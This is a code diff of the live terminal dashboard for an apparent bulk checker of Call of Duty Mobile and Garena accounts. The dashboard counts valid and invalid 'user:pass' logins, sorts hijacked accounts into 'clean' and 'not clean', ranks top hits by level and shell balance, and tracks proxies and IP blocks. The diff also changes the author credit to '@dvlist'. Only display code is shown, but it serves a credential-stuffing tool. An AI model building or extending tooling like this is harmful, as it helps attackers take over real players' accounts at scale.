-            equal=False,
-            padding=(0, 2)
-        )
-        c.print(Panel(stats_levels, border_style="bright_yellow", box=ROUNDED, padding=(0, 1)))
+        stats_levels = Columns([stats_table, level_table], expand=False, equal=False, padding=(0, 2))
+        console.print(Panel(stats_levels, border_style="bright_yellow", box=ROUNDED, padding=(0, 1)))
 
         gc = stats.get('game_counts', {})
-        active_games = [
-            (label_name, gc.get(key, 0))
-            for key, label_name in names
-            if gc.get(key, 0) > 0
-        ]
+        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
 
         if active_games:
-            games_table = Table(
-                title="[bold bright_cyan]◈ GAMES FOUND[/bold bright_cyan]",
-                box=ROUNDED,
-                border_style="bright_cyan",
-                show_header=True,
-                header_style="bold dim",
-                padding=(0, 2),
-                expand=False
-            )
+            games_table = Table(title="[bold bright_cyan]◈ GAMES FOUND[/bold bright_cyan]", box=ROUNDED, border_style="bright_cyan", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
             games_table.add_column("Game", style="dim", no_wrap=True, width=24)
             games_table.add_column("Count", justify="right", style="bright_white", width=8)
             games_table.add_column("Bar", no_wrap=True)
-            peak = max(count for _, count in active_games) or 1
-            for label_name, count in active_games:
-                games_table.add_row(
-                    f"[dim]{label_name}[/dim]",
-                    f"[bright_cyan]{count:,}[/bright_cyan]",
-                    self.bar(count, peak, "bright_cyan", 16)
-                )
-            c.print(Panel(games_table, border_style="bright_cyan", box=ROUNDED, padding=(0, 1)))
+            peak = max(c for _, c in active_games) or 1
+            for label, count in active_games:
+                games_table.add_row(f"[dim]{label}[/dim]", f"[cyan]{count:,}[/cyan]", self._rich_bar(count, peak, "cyan", 16))
+            console.print(Panel(games_table, border_style="bright_cyan", box=ROUNDED, padding=(0, 1)))
 
         footer_text = Text()
-        footer_text.append("⬡  Powered by @rriellqt", style="magenta bold")
-        c.print(Panel(Align.center(footer_text), border_style="magenta", box=ROUNDED, padding=(0, 1)))
-        c.print()
+        footer_text.append("◈  Powered by @dvlist", style="bold cyan")
+        console.print(Panel(Align.center(footer_text), border_style="cyan", box=ROUNDED, padding=(0, 1)))
+        console.print()
 
-class Deck:
+class BulkLiveDashboard:
+    """Live dashboard — cursor-up erase-and-redraw (works on Android/Termux).
+
+    All terminal output is serialised through _dash_print_lock so threads
+    never interleave.  Any code that wants to print a line above the
+    dashboard must call  dashboard.print_above(line)  rather than
+    writing directly to stdout.
+    """
+
+    # ── ANSI strip helper (class-level) ─────────────────────────────────
+    _ANSI_RE = re.compile(r'\x1b\[[0-9;]*m')
+
+    @staticmethod
+    def _vlen(s: str) -> int:
+        """Visible column width — strips ANSI escapes, counts wide CJK as 2."""
+        import unicodedata as _ucd
+        plain = BulkLiveDashboard._ANSI_RE.sub('', s)
+        w = 0
+        for ch in plain:
+            eaw = _ucd.east_asian_width(ch)
+            w += 2 if eaw in ('W', 'F') else 1   # only full-width CJK = 2
+        return w
+
     def __init__(self, total_accounts: int, max_threads: int = 1):
-        self.total = total_accounts
-        self.done = 0
-        self.valid = 0
-        self.invalid = 0
-        self.error = 0
-        self.clean = 0
-        self.not_clean = 0
-        self.codm_present = 0
-        self.no_codm = 0
-        self.start_time = time.time()
-        self.ip_blocked = False
-        self.proxy_mode = False
-        self.active_threads = max_threads
-        self.max_threads = max_threads
-        self.highest_clean_level = 0
-        self.highest_clean_shell = 0
-        self.highest_nc_level = 0
+        self.total              = total_accounts
+        self.done               = 0
+        self.valid              = 0
+        self.invalid            = 0
+        self.error              = 0
+        self.clean              = 0
+        self.not_clean          = 0
+        self.codm_present       = 0
+        self.no_codm            = 0
+        self.start_time         = time.time()
+        self.ip_blocked         = False
+        self.active_threads     = max_threads
+        self.max_threads        = max_threads
+        self.highest_clean_level  = 0
+        self.highest_clean_shell  = 0
+        self.highest_nc_level     = 0
         self.highest_overall_level = 0
-        self.current_proxy = None
+        self.current_proxy      = None
         self.current_proxy_line = None
-        self._lock = threading.Lock()
-        self._snap = {}
-        self._was_rendered = False
-        self.refresh()
+        self._lock              = threading.Lock()
+        self._snap: dict        = {}
+        # CPM sparkline — 1-second samples, keep 20
+        self._cpm_history:   list  = []
+        self._last_sample_t: float = time.time()
+        self._last_sample_n: int   = 0
+        # Level distribution buckets
+        self._lvl_buckets       = [0, 0, 0, 0]  # 1-100, 101-200, 201-349, 350+
+        # Live feed — last 10 results
+        self._feed: list        = []
+        self._feed_counter: int = 0
+        # Top hits — accounts lv 100+
+        self._top_hits: list    = []
+        # Redraw state
+        self._dash_lines:  int   = 0    # lines the last render occupied
+        self._last_redraw: float = 0.0
+        self._redraw_iv:   float = 0.3  # min seconds between redraws
+        self._last_tw:     int   = 0    # last-rendered terminal width (resize detect)
+        self._build_snap()
 
+    # ── Public API ───────────────────────────────────────────────────────
     def start(self):
-        global active
-        active = self
-        with dashlock:
-            sys.stdout.write(self.render() + '\n')
-            sys.stdout.flush()
-        self._was_rendered = True
+        global _active_dashboard
+        _active_dashboard = self
+        with _dash_print_lock:
+            txt = self.render()
+            self._dash_lines = txt.count('\n')
+            _raw_write(txt)
+            _raw_flush()
 
     def stop(self):
-        global active
-        active = None
+        global _active_dashboard
+        _active_dashboard = None
+        with _dash_print_lock:
+            self._erase()
+            _raw_flush()
 
     def record_start(self, index: int, account: str):
         pass
 
     def set_current_proxy(self, proxy: str = None, line: int = None):
         with self._lock:
-            if proxy:
-                self.current_proxy = proxy
-            if line is not None:
-                self.current_proxy_line = line
+            if proxy:            self.current_proxy      = proxy
+            if line is not None: self.current_proxy_line = line
 
     def set_cooldown(self, seconds: float):
         pass
@@ -981,165 +885,446 @@ class Deck:
                error_reason: str = ''):
         with self._lock:
             self.done += 1
+            self._feed_counter += 1
             if success:
                 self.valid += 1
                 if is_clean:
                     self.clean += 1
-                    if codm_level > self.highest_clean_level:
-                        self.highest_clean_level = codm_level
-                    if shell_balance > self.highest_clean_shell:
-                        self.highest_clean_shell = shell_balance
+                    if codm_level    > self.highest_clean_level:  self.highest_clean_level  = codm_level
+                    if shell_balance > self.highest_clean_shell:   self.highest_clean_shell  = shell_balance
                 else:
                     self.not_clean += 1
-                    if codm_level > self.highest_nc_level:
-                        self.highest_nc_level = codm_level
+                    if codm_level > self.highest_nc_level: self.highest_nc_level = codm_level
                 if has_codm:
                     self.codm_present += 1
-                    if codm_level > self.highest_overall_level:
-                        self.highest_overall_level = codm_level
+                    if codm_level > self.highest_overall_level: self.highest_overall_level = codm_level
+                    if codm_level > 0:
+                        if codm_level <= 100:   self._lvl_buckets[0] += 1
+                        elif codm_level <= 200: self._lvl_buckets[1] += 1
+                        elif codm_level <= 349: self._lvl_buckets[2] += 1
+                        else:                   self._lvl_buckets[3] += 1
+                    if codm_level >= 100:
+                        tag = 'CLEAN' if is_clean else 'NOT CLN'
+                        self._top_hits.append((codm_level, account.split(':')[0][:20], tag, is_clean))
+                        self._top_hits.sort(key=lambda x: x[0], reverse=True)
+                        self._top_hits = self._top_hits[:5]
                 else:
                     self.no_codm += 1
+                reason = 'CLEAN' if is_clean else 'NOT CLN'
+                feed_lvl = codm_level if (has_codm and codm_level) else 0
+                self._feed.append((self._feed_counter, account.split(':')[0][:20], True, reason, feed_lvl))
             else:
                 self.invalid += 1
-            self.refresh()
-        self.emit(account, success, is_clean, has_codm, codm_level, shell_balance, error_reason)
+                reason = error_reason[:20] if error_reason else "Account Doesn't E..."
+                self._feed.append((self._feed_counter, account.split(':')[0][:20], False, reason, 0))
+            if len(self._feed) > 10:
+                self._feed = self._feed[-10:]
+            self._build_snap()
+        self._on_result(account, success, is_clean, has_codm, codm_level, shell_balance, error_reason)
 
-    def emit(self, account, success, is_clean, has_codm, codm_level, shell, error_reason):
-        m = bulk
-        lines_to_print = []
-        if m != 'full':
-            if not success:
-                if m == 'none':
-                    lines_to_print.append(f'  {rd}INVALID{rst}  {dim}{account}{rst}\n')
-                else:
-                    reason = error_reason or 'Invalid'
-                    lines_to_print.append(f'  {rd}INVALID{rst}  {dim}{account}{rst}  {dim}{reason}{rst}\n')
+    def print_above(self, text: str):
+        """Print one or more lines above the pinned dashboard.
+        text must NOT have a trailing newline — one is appended here.
+        Safe to call from any thread.
+        """
+        with _dash_print_lock:
+            self._erase()
+            _raw_write(text + '\n')
+            self._redraw()
+            _raw_flush()
+
+    # ── Internal ─────────────────────────────────────────────────────────
+    def _erase(self):
+        """Cursor-up N + erase-to-end.  Call under _dash_print_lock."""
+        if self._dash_lines > 0:
+            _raw_write(f'\x1b[{self._dash_lines}A\x1b[0J')
+
+    def _redraw(self):
+        """Re-render dashboard in-place.  Call under _dash_print_lock."""
+        # Detect terminal resize — if width changed, the old lines may have
+        # wrapped and our cursor-up count won't erase them. Full-clear then.
+        cur_tw = shutil.get_terminal_size((84, 24)).columns
+        if cur_tw != self._last_tw:
+            _raw_write('\x1b[H\x1b[2J')
+            self._dash_lines = 0
+            self._last_tw = cur_tw
+        txt = self.render()
+        self._dash_lines = txt.count('\n')
+        _raw_write(txt)
+
+    def _on_result(self, account, success, is_clean, has_codm, codm_level, shell, error_reason):
+        """Decide what to output after record().  Called from worker threads."""
+        m = _BULK_MODE
+
+        if m == 'full':
+            # display_codm_info owns printing; just do a timed stats refresh
+            with _dash_print_lock:
+                now = time.time()
+                if now - self._last_redraw >= self._redraw_iv:
+                    self._erase()
+                    self._redraw()
+                    _raw_flush()
+                    self._last_redraw = now
+            return
+
+        # 'semi' / 'none' — compact one-liner
+        if not success:
+            reason = error_reason or 'Invalid'
+            if m == 'none':
+                line = f'  \033[1;91m✖ INVALID\033[0m  \033[2m{account}\033[0m'
             else:
-                if m == 'none':
-                    lines_to_print.append(f'  {gn}VALID{rst}  {wh}{account}{rst}\n')
-                elif m == 'semi':
-                    lvl_c = cy if codm_level >= 200 else wh
-                    clean_s = f'{gn}CLEAN{rst}' if is_clean else f'{yl}NOT CLEAN{rst}'
-                    shell_s = f'{yl}Shell:{shell:,}{rst}' if shell > 0 else ''
-                    parts = [f'{gn}VALID{rst}', f'{lvl_c}Lv{codm_level}{rst}' if has_codm else f'{dim}No CODM{rst}', clean_s]
-                    if shell_s:
-                        parts.append(shell_s)
-                    lines_to_print.append('  ' + '  '.join(parts) + f'  {dim}{account}{rst}\n')
+                line = (f'  \033[1;91m✖ INVALID\033[0m  \033[2m{account}\033[0m'
+                        f'  \033[93m{reason}\033[0m')
+        else:
+            if m == 'none':
+                line = f'  \033[1;92m✔ VALID\033[0m  \033[97m{account}\033[0m'
+            else:  # semi
+                lc   = '\033[96m' if codm_level >= 200 else '\033[97m'
+                cs   = '\033[1;92mCLEAN\033[0m' if is_clean else '\033[1;93mNOT CLEAN\033[0m'
+                ss   = f'  \033[93mShell:{shell:,}\033[0m' if shell > 0 else ''
+                lvls = f'{lc}Lv{codm_level}\033[0m' if has_codm else '\033[2mNo CODM\033[0m'
+                line = f'  \033[1;92m✔ VALID\033[0m  {lvls}  {cs}{ss}  \033[2m{account}\033[0m'
 
-        with dashlock:
-            if self._was_rendered:
-                dash_str = self.render()
-                dash_lines = dash_str.count('\n') + 1
-                sys.stdout.write(f'\x1b[{dash_lines}A\x1b[0J')
+        self.print_above(line)
 
-            for line in lines_to_print:
-                sys.stdout.write(line)
-            sys.stdout.write(self.render() + '\n')
-            sys.stdout.flush()
-
-    def refresh(self):
+    def _build_snap(self):
+        """Snapshot state (called under self._lock)."""
         elapsed = time.time() - self.start_time
-        done = self.done
-        rate = done / elapsed if elapsed > 0 else 0
-        cpm = rate * 1000
-        eta_s = (self.total - done) / rate if rate > 0 and done < self.total else 0
+        done    = self.done
+        rate    = done / elapsed if elapsed > 0 else 0
+        cpm     = rate * 60
+        eta_s   = (self.total - done) / rate if rate > 0 and done < self.total else 0
         self._snap = {
-            'done': done, 'total': self.total,
+            'done': done,  'total':  self.total,
             'valid': self.valid, 'invalid': self.invalid, 'error': self.error,
             'clean': self.clean, 'not_clean': self.not_clean,
-            'codm': self.codm_present, 'no_codm': self.no_codm,
-            'rate': rate, 'cpm': cpm, 'elapsed': elapsed, 'eta': eta_s,
+            'codm':  self.codm_present, 'no_codm': self.no_codm,
+            'rate':  rate, 'cpm': cpm, 'elapsed': elapsed, 'eta': eta_s,
             'threads': self.active_threads, 'max_threads': self.max_threads,
             'ip_blocked': self.ip_blocked,
             'hcl': self.highest_clean_level, 'hcs': self.highest_clean_shell,
-            'hnl': self.highest_nc_level, 'hol': self.highest_overall_level,
+            'hnl': self.highest_nc_level,    'hol': self.highest_overall_level,
+            'lvl_buckets': list(self._lvl_buckets),
+            'feed': list(self._feed),
+            'top_hits': list(self._top_hits),
         }
 
+    def _sample_cpm(self, done_now: int) -> None:
+        now = time.time()
+        dt  = now - self._last_sample_t
+        if dt >= 1.0:
+            cpm_now = ((done_now - self._last_sample_n) / dt) * 60
+            self._cpm_history.append(cpm_now)
+            if len(self._cpm_history) > 20:
+                self._cpm_history.pop(0)
+            self._last_sample_t = now
+            self._last_sample_n = done_now
+
+    @staticmethod
+    def _sparkline(values: list, width: int = 20) -> str:
+        if not values:
+            return '░' * width
+        vals = ([0] * (width - len(values)) + values) if len(values) < width else values[-width:]
+        mx   = max(vals) or 1
+        bars = '▁▂▃▄▅▆▇█'
+        return ''.join(bars[min(int(v / mx * 8), 7)] for v in vals)
+
+    # ── Render ───────────────────────────────────────────────────────────
     def render(self) -> str:
         with self._lock:
             s = dict(self._snap)
         if not s:
             return ''
 
-        done = s['done']
-        total = s['total']
-        valid = s['valid']
-        invalid = s['invalid']
-        clean = s['clean']
-        nc = s['not_clean']
-        err = s['error']
-        rate = s['rate']
-        cpm = s['cpm']
-        elapsed = s['elapsed']
-        eta_s = s['eta']
-        threads_n = s['threads']
-        max_thr = s['max_threads']
-        ip_ok = not s['ip_blocked']
-        hcl = s['hcl']
-        hcs = s['hcs']
-        hnl = s['hnl']
-        hol = s['hol']
+        self._sample_cpm(s['done'])
 
+        done   = s['done'];  total = s['total']
+        valid  = s['valid']; invalid = s['invalid']
+        clean  = s['clean']; nc    = s['not_clean']
+        rate   = s['rate'];  cpm   = s['cpm']
+        elapsed_f = s['elapsed']; eta_f = s['eta']
+        threads   = s['threads']; max_thr = s['max_threads']
+        ip_ok  = not s['ip_blocked']
+        hcl = s['hcl']; hcs = s['hcs']; hnl = s['hnl']; hol = s['hol']
+        codm_count = s.get('codm', 0)
+        no_codm    = s.get('no_codm', 0)
         pct = done / total * 100 if total else 0
-        bw = 30
-        fill = int(pct / 100 * bw)
+        lvl_b = s.get('lvl_buckets', [0, 0, 0, 0])
+        feed  = s.get('feed', [])
+        top_hits = s.get('top_hits', [])
 
-        MG = '\033[38;2;200;100;255m'
-        WH = '\033[97;1m'
-        DIM = '\033[2m'
-        RST = '\033[0m'
-        GN = '\033[92;1m'
-        RD = '\033[91;1m'
-        YL = '\033[93;1m'
+        E   = '\x1b'
+        # Soft palette: slate frame, color on data (no magenta).
+        AM  = E + '[1;97m'           # titles / brand
+        CY  = E + '[96m'             # cyan accent (ETA / Lv tag)
+        GN  = E + '[92m'             # valid / clean
+        RD  = E + '[91m'             # invalid
+        YL  = E + '[93m'             # not clean / yellow
+        TL  = E + '[94m'             # blue — CODM
+        PK  = E + '[38;5;139m'       # soft purple-gray — No CODM (not magenta)
+        OR  = E + '[38;5;208m'       # orange accent (level high / rate limit)
+        WH  = E + '[97m'             # white text
+        DIM = E + '[2m'
+        BRD = E + '[38;5;244m'       # soft slate — frame
+        BRDd= E + '[38;5;238m'       # darker slate — bar tracks
+        RST = E + '[0m'
 
-        bar = f"{MG}{'█' * fill}{DIM}{'░' * (bw - fill)}{RST}"
-        e = f'{int(elapsed//3600):02d}:{int(elapsed%3600//60):02d}:{int(elapsed%60):02d}'
-        eta = f'{int(eta_s//60):02d}m{int(eta_s%60):02d}s'
-        
-        if self.proxy_mode:
-            ip_val = "PROXY"
-            ip_col = YL
-        else:
-            ip_val = "CLEAR" if ip_ok else "BLOCKED"
-            ip_col = GN if ip_ok else RD
-            
-        thr_val = f"{threads_n}/{max_thr}"
+        def _fmt(secs):
+            h = int(secs // 3600); m = int(secs % 3600 // 60); sc = int(secs % 60)
+            return f'{h}h {m:02d}m {sc:02d}s' if h else f'{m}m {sc:02d}s'
 
-        def pad_vis(x, w_):
-            vis = len(re.sub(r'\033\[[0-9;]*m', '', str(x)))
-            return str(x) + ' ' * max(0, w_ - vis)
+        elapsed_str = _fmt(elapsed_f)
+        eta_str     = _fmt(eta_f)
+        clock       = time.strftime('%H:%M:%S')
+        thr_val     = f'{threads}/{max_thr}'
 
-        def center(x, w_):
-            vis = len(re.sub(r'\033\[[0-9;]*m', '', str(x)))
-            total_pad = max(0, w_ - vis)
-            left = total_pad // 2
-            right = total_pad - left
-            return ' ' * left + str(x) + ' ' * right
+        _tw = shutil.get_terminal_size((84, 24)).columns
+        W   = max(_tw - 2, 60)
+        V   = BulkLiveDashboard._vlen
+        H   = '─'
+        HH  = '━'
+        IW  = W - 2
 
-        prog_bar = f" PROGRESS: {bar}  {MG}{pct:5.1f}%{RST}  [{WH}{done}{RST}/{DIM}{total}{RST}]"
-        prog_bar_padded = pad_vis(prog_bar, 66)
+        def _pad(text, width):
+            return text + ' ' * max(width - V(text), 0)
 
-        c1_w = 24
-        c2_w = 22
-        c3_w = 18
+        def _ctr(text, width):
+            vis = V(text)
+            lp = max((width - vis) // 2, 0)
+            return ' ' * lp + text + ' ' * max(width - vis - lp, 0)
 
-        lines = [
-            "",
-            f"  {MG}╔{'═' * 66}╗{RST}",
-            f"  {MG}║{RST}{prog_bar_padded}{MG}║{RST}",
-            f"  {MG}╠{'═' * 24}╦{'═' * 22}╦{'═' * 18}╣{RST}",
-            f"  {MG}║{RST}{center(f'{MG}[ ACCOUNTS ]{RST}', c1_w)}{MG}║{RST}{center(f'{MG}[ PERFORMANCE ]{RST}', c2_w)}{MG}║{RST}{center(f'{MG}[ HIGHLIGHTS ]{RST}', c3_w)}{MG}║{RST}",
-            f"  {MG}║{RST}{pad_vis(f' VALID     : {GN}{valid:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' CPM       : {WH}{cpm:<8.0f}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' TOP CLEAN : {GN}{hcl:<5}{RST}', c3_w)}{MG}║{RST}",
-            f"  {MG}║{RST}{pad_vis(f' INVALID   : {RD}{invalid:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' SPEED     : {WH}{rate:<8.1f}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' TOP SHELL : {YL}{hcs:<5}{RST}', c3_w)}{MG}║{RST}",
-            f"  {MG}║{RST}{pad_vis(f' CLEAN     : {GN}{clean:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' ELAPSED   : {WH}{e:<8}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' TOP NC    : {YL}{hnl:<5}{RST}', c3_w)}{MG}║{RST}",
-            f"  {MG}║{RST}{pad_vis(f' NOT CLEAN : {YL}{nc:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' ETA       : {WH}{eta:<8}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' PEAK LVL  : {MG}{hol:<5}{RST}', c3_w)}{MG}║{RST}",
-            f"  {MG}║{RST}{pad_vis(f' ERRORS    : {DIM}{err:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' THREADS   : {WH}{thr_val:<8}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' IP STATUS : {ip_col}{ip_val:<5}{RST}', c3_w)}{MG}║{RST}",
-            f"  {MG}╚{'═' * 24}╩{'═' * 22}╩{'═' * 18}╝{RST}",
-            ""
+        def _rj(text, width):
+            # right-justify by visible length
+            return ' ' * max(width - V(text), 0) + text
+
+        def _bar(frac, width, color):
+            # summary-style █ block bar, dim track for the remainder
+            frac = min(max(frac, 0.0), 1.0)
+            fill = int(round(frac * width))
+            return color + '█' * fill + RST + DIM + '░' * (width - fill) + RST
+
+        def _clip(text, width):
+            # visible-length clip of ANSI text to width (no ellipsis)
+            vis = 0; out = []; i = 0; s = text
+            while i < len(s):
+                if s[i] == '\x1b':
+                    j = s.find('m', i)
+                    if j >= 0:
+                        out.append(s[i:j+1]); i = j + 1; continue
+                if vis >= width:
+                    break
+                out.append(s[i]); vis += 1; i += 1
+            out.append(RST)
+            return ''.join(out)
+
+        def _bord(content):
+            vl = V(content)
+            if vl > IW:
+                t, tv = _trunc(content, IW)
+                return f'{BRD}│{RST}' + t + ' ' * max(IW - tv, 0) + f'{BRD}│{RST}'
+            return f'{BRD}│{RST}' + _pad(content, IW) + f'{BRD}│{RST}'
+
+        def _pct(n, d):
+            return f'({n/d*100:.1f}%)' if d else '(0.0%)'
+
+        # ═══ OUTER BORDER + HEADER + STAT TABLE (one connected box) ═══
+        top_border = f'{BRD}╭{H * IW}╮{RST}'
+        bot_border = f'{BRD}╰{H * IW}╯{RST}'
+
+        hdr_l = f' {AM}◆{RST} {AM}HESU{RST} {CY}v2.0{RST}  {DIM}—{RST}  {PK}@dvlist{RST}'
+        hdr_r = f'{GN}●{RST} {GN}ACTIVE{RST}  {DIM}·{RST}  {WH}{clock}{RST} '
+        hdr_gap = max(IW - V(hdr_l) - V(hdr_r), 1)
+        hdr_row = f'{BRD}│{RST}{hdr_l}{" " * hdr_gap}{hdr_r}{BRD}│{RST}'
+
+        # Stat table — separate thick box inside outer border
+        ncols = 5
+        st_inner = IW - 4
+        st_cw_total = st_inner - (ncols - 1)
+        cw = st_cw_total // ncols
+        last_cw = st_cw_total - cw * (ncols - 1)
+        widths = [cw] * (ncols - 1) + [last_cw]
+
+        clean_of = f'{clean/valid*100:.1f}% of valid' if valid else '—'
+        stat_data = [
+            (f'{done:,}',     'PROCESSED', f'{DIM}of {total:,}{RST}'),
+            (f'{valid:,}',    'VALID',     f'{YL}{pct:.1f}%{RST}'),
+            (f'{clean:,}',    'CLEAN',     f'{DIM}{clean_of}{RST}'),
+            (f'{rate:.1f}/s', 'RATE',      f'{CY}ETA {eta_str}{RST}'),
+            (thr_val,         'THREADS',   f'{DIM}Bulk Scan{RST}'),
         ]
+
+        def _cell(val, label, sub, cwidth):
+            return [
+                _ctr(_clip(f'{WH}{val}{RST}', cwidth), cwidth),
+                _ctr(_clip(f'{DIM}{label}{RST}', cwidth), cwidth),
+                _ctr(sub, cwidth),
+            ]
+
+        cells = [_cell(v, l, sb, widths[i]) for i, (v, l, sb) in enumerate(stat_data)]
+        st_top = f' {BRD}┏{HH * st_inner}┓{RST}'
+        st_bot = f' {BRD}┗{HH * st_inner}┛{RST}'
+        stat_rows = []
+        for ri in range(3):
+            row = f' {BRD}┃{RST}' + f'{BRD}┃{RST}'.join(cells[c][ri] for c in range(ncols)) + f'{BRD}┃{RST}'
+            stat_rows.append(row)
+
+        # ═══ PROGRESS LINE (filling bar) ═══
+        prog_pre  = f' {DIM}PROGRESS{RST} {YL}{pct:.1f}%{RST}  '
+        prog_post = f'  {WH}{done:,}{RST}{DIM}/{RST}{WH}{total:,}{RST}  {DIM}ETA{RST} {CY}{eta_str}{RST} '
+        bar_w = max(IW - V(prog_pre) - V(prog_post), 10)
+        fill  = int(round(bar_w * min(max(pct, 0.0), 100.0) / 100))
+        bar   = f'{GN}{"━" * fill}{RST}{BRDd}{"─" * (bar_w - fill)}{RST}'
+        prog  = prog_pre + bar + prog_post
+
+        # ═══ TWO-COLUMN HELPERS ═══
+        half = IW // 2
+
+        def _trunc(text, width):
+            vis = 0; out = []; i = 0; s = text
+            while i < len(s):
+                if s[i] == '\x1b':
+                    j = s.find('m', i)
+                    if j >= 0:
+                        out.append(s[i:j+1]); i = j + 1; continue
+                if vis >= width:
+                    break
+                out.append(s[i]); vis += 1; i += 1
+            truncated = i < len(s)
+            if truncated and width >= 3:
+                while len(out) > 0 and vis > width - 3:
+                    ch = out.pop()
+                    if not ch.startswith('\x1b'):
+                        vis -= 1
+                out.append(RST + DIM + '...' + RST)
+                vis += 3
+            else:
+                out.append(RST)
+            return ''.join(out), vis
+
+        def _lr(left_text, right_text):
+            lw = half - 1
+            t, vis = _trunc(left_text, lw)
+            return t + ' ' * max(lw - vis, 0) + f'{BRDd}│{RST}' + right_text
+
+        # ═══ SECTION 1: ACCOUNT RESULTS | SYSTEM ═══
+        vp   = _pct(valid, done)
+        ip_s = _pct(invalid, done)
+        cp   = _pct(clean, valid)
+        np_s = _pct(nc, valid)
+        dp   = _pct(codm_count, valid)
+        ndp  = f'({no_codm/valid*100:.1f}%)' if valid else '(0.0%)'
+
+        ip_val = 'CLEAR' if ip_ok else 'BLOCKED'
+        ip_col = GN if ip_ok else RD
+
+        sec1 = [
+            _lr(f' {AM}│{RST} {AM}ACCOUNT RESULTS{RST}',
+                f' {AM}│{RST} {AM}SYSTEM{RST}'),
+            _lr(f'   {GN}▸{RST} {GN}Valid{RST}        {GN}{valid:>8,}{RST}  {DIM}{vp}{RST}',
+                f'   {CY}◇{RST} {DIM}Threads{RST}     {CY}{thr_val}{RST}'),
+            _lr(f'   {RD}▸{RST} {RD}Invalid{RST}      {RD}{invalid:>8,}{RST}  {DIM}{ip_s}{RST}',
+                f'   {ip_col}●{RST} {DIM}IP Status{RST}   {ip_col}{ip_val}{RST}'),
+            _lr(f'   {GN}◆{RST} {GN}Clean{RST}        {GN}{clean:>8,}{RST}  {DIM}{cp}{RST}',
+                f'   {GN}▸{RST} {DIM}Speed{RST}       {GN}{rate:.1f}/s{RST}'),
+            _lr(f'   {YL}◇{RST} {YL}Not Clean{RST}    {YL}{nc:>8,}{RST}  {DIM}{np_s}{RST}',
+                f'   {YL}◆{RST} {DIM}CPM{RST}         {YL}{cpm:.0f}{RST}'),
+            _lr(f'   {TL}●{RST} {TL}CODM{RST}         {TL}{codm_count:>8,}{RST}  {DIM}{dp}{RST}',
+                f'   {CY}◇{RST} {DIM}Elapsed{RST}     {WH}{elapsed_str}{RST}'),
+            _lr(f'   {PK}○{RST} {PK}No CODM{RST}      {PK}{no_codm:>8,}{RST}  {DIM}{ndp}{RST}',
+                f'   {CY}○{RST} {DIM}ETA{RST}         {CY}{eta_str}{RST}'),
+        ]
+
+        # ═══ SECTION 2: LEVELS & PEAKS | LIVE FEED ═══
+        lvl_total_n = sum(lvl_b) or 1
+        lvl_labels = ['Lv  1-100', 'Lv 101-200', 'Lv 201-349', 'Lv  350+']
+        lvl_colors = [GN, YL, OR, RD]
+        max_bar_w = max(half - 1 - 29, 4)
+
+        hdr_bar_w = max(half - 22, 4)
+        lvl_hdr_bar = AM + '━' * hdr_bar_w + RST
+
+        lvl_rows = []
+        for i, (lb, cnt) in enumerate(zip(lvl_labels, lvl_b)):
+            p = cnt / lvl_total_n * 100
+            bar_len = int(cnt / max(max(lvl_b), 1) * max_bar_w)
+            bar_fill = lvl_colors[i] + '━' * bar_len + RST + BRDd + '─' * (max_bar_w - bar_len) + RST
+            lvl_rows.append(f'   {lvl_colors[i]}{lb}{RST}  {WH}{cnt:>3d}{RST} {DIM}({p:5.1f}%){RST} {bar_fill}')
+
+        lvl_rows.append('')
+        lvl_rows.append(f'   {YL}◆{RST} {WH}Peak Shell{RST}       {YL}{hcs:>8,}{RST}')
+        lvl_rows.append(f'   {GN}◆{RST} {WH}Peak Clean{RST}       {GN}{"Lv " + str(hcl):>8s}{RST}')
+        lvl_rows.append(f'   {YL}○{RST} {WH}Peak Not Cln{RST}     {YL}{"Lv " + str(hnl):>8s}{RST}')
+
+        if top_hits:
+            lvl_rows.append('')
+            lvl_rows.append(f' {AM}│{RST} {AM}TOP HITS (Lv 100+){RST}')
+            for lvl, acct, tag, is_cln in top_hits[:3]:
+                tc = GN if is_cln else YL
+                lvl_rows.append(f'  {CY}Lv {lvl:<4d}{RST}  {DIM}{acct}{RST}  {tc}◇ {tag}{RST}')
+
+        feed_rows = []
+        feed_text_w = max(IW - half - 1 - 13, 8)
+        acct_w   = max(feed_text_w - 18, 6)  # leaves 16 for reason column
+        reason_w = 14
+        def _fit(s, w):
+            if len(s) > w:
+                return s[:w-1] + '…'
+            return s.ljust(w)
+        for entry in feed[-10:]:
+            num, acct, ok, reason = entry[0], entry[1], entry[2], entry[3]
+            lvl = entry[4] if len(entry) > 4 else 0
+            lvl_tag = f'{CY}Lv{lvl}{RST} ' if lvl else ''
+            if ok:
+                reason_disp = reason
+                rc = GN if reason == 'CLEAN' else YL
+            else:
+                reason_disp = reason
+                rc = RD
+            acct_s   = _fit(acct, acct_w)
+            reason_s = _fit(reason_disp, reason_w)
+            mark = f'{GN}✔{RST}' if ok else f'{RD}✖{RST}'
+            acct_col = WH if ok else DIM
+            text = f'{acct_col}{acct_s}{RST}  {lvl_tag}{rc}{reason_s}{RST}'
+            feed_rows.append(f'  {CY}{num}{RST} {mark}  {text}')
+
+        sec2_hdr = _lr(
+            f' {AM}│{RST} {AM}LEVELS & PEAKS{RST}  {lvl_hdr_bar}',
+            f' {AM}│{RST} {AM}LIVE FEED{RST}')
+        sec2 = [sec2_hdr]
+        mr = max(len(lvl_rows), len(feed_rows))
+        for i in range(mr):
+            left  = lvl_rows[i]  if i < len(lvl_rows)  else ''
+            right = feed_rows[i] if i < len(feed_rows) else ''
+            sec2.append(_lr(left, right))
+
+        # (TOP HITS moved into left column above)
+
+        # ═══ BOTTOM BAR (centered) ═══
+        bot_content = f'{PK}◆{RST} {PK}@dvlist{RST} {DIM}·{RST} {CY}{pct:.1f}%{RST} {DIM}·{RST} {WH}{rate:.1f}/s{RST} {DIM}·{RST} ETA {CY}{eta_str}{RST} {DIM}·{RST} {WH}{done:,}{RST} {DIM}/ {total:,}{RST}'
+        bot_content = _ctr(bot_content, IW)
+
+        # ═══ ASSEMBLE ═══
+        lines = ['', top_border, hdr_row]
